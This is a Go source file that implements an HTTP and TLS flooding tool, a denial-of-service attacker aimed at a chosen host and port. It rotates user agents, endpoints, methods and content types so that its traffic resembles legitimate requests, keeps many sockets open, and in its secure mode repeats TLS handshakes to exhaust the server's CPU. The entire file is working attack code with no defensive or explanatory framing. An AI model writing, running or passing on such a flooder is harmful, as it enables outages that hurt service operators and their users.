package internals

import (
	"crypto/tls"
	"math"
	"math/rand"
	"net"
	"strconv"
	"time"
)

type HttpFlooder struct {
	Host     string // target host
	Port     int    // target port
	Duration int    // duration of flood
	Interval int    // interval per request batch
	Secure   bool   // https or not
	Sockets  int    // how many sockets to use
}

func GenerateRandomUserAgent() string {
	userAgents := []string{
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S931B Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S931U Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-S928B/DS) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-S928W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-F9560 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-F956U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",
		"Mozilla/5.0 (Android 15; Mobile; SM-G556B/DS; rv:130.0) Gecko/130.0 Firefox/130.0",
		"Mozilla/5.0 (Android 15; Mobile; SM-G556B; rv:130.0) Gecko/130.0 Firefox/130.0",
		"Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36 Dalvik/2.1.0 (Linux; U; Android 13; SM-S911B Build/TP1A.220624.014)",
		"Mozilla/5.0 (Linux; Android 13; SM-S911U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro Build/AD1A.240418.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.54 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; Pixel 9 Build/AD1A.240411.003.A5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.54 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; Pixel 8 Pro Build/AP4A.250105.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; Pixel 8 Build/AP4A.250105.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone17,5; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 FireKeepers/1.7.0",
		"Mozilla/5.0 (iPhone17,1; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Mohegan Sun/4.7.4",
		"Mozilla/5.0 (iPhone17,2; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Resorts/4.5.2",
		"Mozilla/5.0 (iPhone17,3; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 FireKeepers/1.6.1",
		"Mozilla/5.0 (iPhone17,4; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Resorts/4.7.5",
		"Mozilla/5.0 (iPhone16,2; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Resorts/4.7.5",
		"Mozilla/5.0 (iPhone14,7; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Mohegan Sun/4.7.3",
		"Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1",
		"Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
		"Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
		"Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3",
		"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
		"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
		"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
		"Mozilla/5.0 (iPad16,3; CPU OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Tropicana_NJ/5.7.1",
		"Dalvik/2.1.0 (Linux; U; Android 14; SM-X306B Build/UP1A.231005.007)",
		"Dalvik/2.1.0 (Linux; U; Android 14; SM-P619N Build/UP1A.231005.007)",
		"Dalvik/2.1.0 (Linux; U; Android 15; 24091RPADG Build/AQ3A.240801.002)",
		"Dalvik/2.1.0 (Linux; U; Android 11; KFRASWI Build/RS8332.3115N)",
		"Dalvik/2.1.0 (Linux; U; Android 14; SM-P619N Build/UP1A.231005.007)",
		"Mozilla/5.0 (iPad15,3; CPU OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Resorts/4.7.5",
		"Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
		"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Safari/605.1.15",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36>",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
		"Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0",
		"AppleTV14,1/16.1",
		// can add more...
	}

	return userAgents[rand.Intn(len(userAgents))]
}

func GenerateRandomPayload(size int) string {
	alphabet := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"
	payload := make([]rune, rand.Intn(size))

	for i := 0; i < len(payload); i++ {
		payload[i] = rune(alphabet[rand.Intn(len(alphabet))])
	}

	return string(payload)
}

func GenerateRandomEndpoint() string {
	endpoints := []string{
		"/", // root
		"/index.htm",
		"/index.html",
		"/index.php",
		"/index.cgi",
		"/home",
		"/index",
		"/contact",
		"/contact-us",
		"/support",
		"/login",
		"/products",
		"/api/manage",
		"/api/accounts",
		"/api/users",
		"/api/submit",
		"/api/create_post.php",
		"/api/create_reply.php",
		"/api/delete_post.php",
		"/api/delete_reply.php",
		"/sign-in.html",
		"/employers",
		"/vision.htm",
		"/" + GenerateRandomPayload(30),
	}

	return endpoints[rand.Intn(len(endpoints))]
}

func GenerateRandomContentType() string {
	contentTypes := []string{
		"text/css",
		"text/html",
		"text/javascript",
		"text/xml",
		"text/csv",
		"text/plain",
		"image/png",
		"image/jpeg",
		"image/avif",
		"image/apng",
		"image/bmp",
		"image/gif",
		"application/octet-stream",
		"application/x-bzip",
		"application/pdf",
		"application/x-bzip2",
		"application/msword",
		"application/gzip",
		"application/rtf",
		"application/x-sh",
		"application/json",
		"application/xml",
		"application/x-7z-compressed",
		"application/x-httpd-php",
		"application/java-archive",
		"video/mpeg",
		"video/mp4",
		"audio/midi",
		"audio/aac",
	}

	return contentTypes[rand.Intn(len(contentTypes))]
}

func GenerateRandomRequests(host string) []string {
	methods := []string{"POST", "GET", "PUT", "HEAD", "DELETE", "OPTIONS", "TRACE", "CONNECT"}

	rand.Shuffle(len(methods), func(i, j int) {
		methods[i], methods[j] = methods[j], methods[i]
	})

	var requests []string
	for _, method := range methods {
		switch method {
		case "GET":
			requests = append(requests, "GET "+GenerateRandomEndpoint()+"?"+strconv.Itoa(rand.Intn(10000))+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
		case "HEAD":
			requests = append(requests, "HEAD "+GenerateRandomEndpoint()+"?"+strconv.Itoa(rand.Intn(10000))+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
		case "POST":
			requests = append(requests, "POST "+GenerateRandomEndpoint()+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\nDate: "+time.Now().UTC().Format(time.RFC1123)+"\r\nContent-Type: "+GenerateRandomContentType()+"\r\n\r\n"+GenerateRandomPayload(1024)+"\r\n\r\n")
		case "PUT":
			requests = append(requests, "PUT "+GenerateRandomEndpoint()+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\nDate: "+time.Now().UTC().Format(time.RFC1123)+"\r\nContent-Type: "+GenerateRandomContentType()+"\r\n\r\n"+GenerateRandomPayload(1024)+"\r\n\r\n")
		case "DELETE":
			requests = append(requests, "DELETE "+GenerateRandomEndpoint()+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
		case "CONNECT":
			requests = append(requests, "CONNECT "+host+":"+strconv.Itoa(rand.Intn(math.MaxUint16))+" HTTP/1.1\r\nHost: "+host+":"+strconv.Itoa(rand.Intn(math.MaxUint16))+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
		case "TRACE":
			requests = append(requests, "TRACE "+GenerateRandomEndpoint()+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
		case "OPTIONS":
			requests = append(requests, "OPTIONS "+GenerateRandomEndpoint()+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
			// WebDAV
			/*case "COPY": requests = append(requests, "COPY "+GenerateRandomEndpoint()+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\nDestination: "+GenerateRandomEndpoint()+"\r\n\r\n")*/
			/*case "MOVE": requests = append(requests, "MOVE "+GenerateRandomEndpoint()+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\nDestination: "+GenerateRandomEndpoint()+"\r\n\r\n")*/
		}
	}

	return requests
}

func (flooder *HttpFlooder) Flood() {
	var secureSuccess int = 0
	sockets := make(map[string]net.Conn)

	start := time.Now()
	for time.Since(start) < time.Duration(flooder.Duration)*time.Second {
		if flooder.Secure {
			// attempts to repetitively do cryptographic work on the server's cpu.

			config := &tls.Config{
				InsecureSkipVerify: false,
			}

			conn, err := tls.Dial("tcp", combineHost(flooder.Host, flooder.Port), config)
			if err != nil {
				print_sumthin("failed to establish tls connection!", ERROR)
				continue
			}

			err = conn.Handshake()
			if err != nil {
				print_sumthin("tls handshake failed!", ERROR)
				continue
			}

			err = conn.Close()
			if err != nil {
				print_sumthin("failed to close tls connection!", ERROR)
				continue
			}
			secureSuccess++

			print_sumthin("Successful handshake(s): "+strconv.Itoa(secureSuccess), INFO)

			if flooder.Interval > 0 {
				time.Sleep(time.Duration(flooder.Interval) * time.Second)
			}

			continue
		}

		if len(sockets) == 0 {
			for i := 0; i < flooder.Sockets; i++ {
				conn, err := net.Dial("tcp", combineHost(flooder.Host, flooder.Port))
				if err != nil {
					print_sumthin("failed to establish connection!", ERROR)
					continue
				}

				sockets[conn.RemoteAddr().String()] = conn
			}
		}

		// if no sockets were created
		if len(sockets) == 0 {
			print_sumthin("failed to create sockets!", ERROR)
			return
		}

		var conn net.Conn
		for key := range sockets {
			conn = sockets[key]
			break
		}

		requests := GenerateRandomRequests(flooder.Host)
		for _, request := range requests {
			n, err := conn.Write([]byte(request))
			if err != nil {
				print_sumthin("failed to send request!", ERROR)

				// assuming that the server forcefully closed our socket
				conn.Close()
				delete(sockets, conn.RemoteAddr().String())

				conn, err = net.Dial("tcp", combineHost(flooder.Host, flooder.Port))
				if err != nil {
					print_sumthin("failed to establish connection!", ERROR)
					break
				}

				sockets[conn.RemoteAddr().String()] = conn
				continue
			}
			print_sumthin("Sent/s: "+strconv.FormatFloat(float64(n)/time.Since(start).Seconds(), 'f', 2, 64)+"B", INFO)
		}

		if flooder.Interval > 0 {
			time.Sleep(time.Duration(flooder.Interval) * time.Second)
		}
	}

	for _, c := range sockets {
		err := c.Close()
		if err != nil {
			print_sumthin("failed to close connection!", ERROR)
			continue
		}
	}

	print_sumthin("finished!", INFO)
}
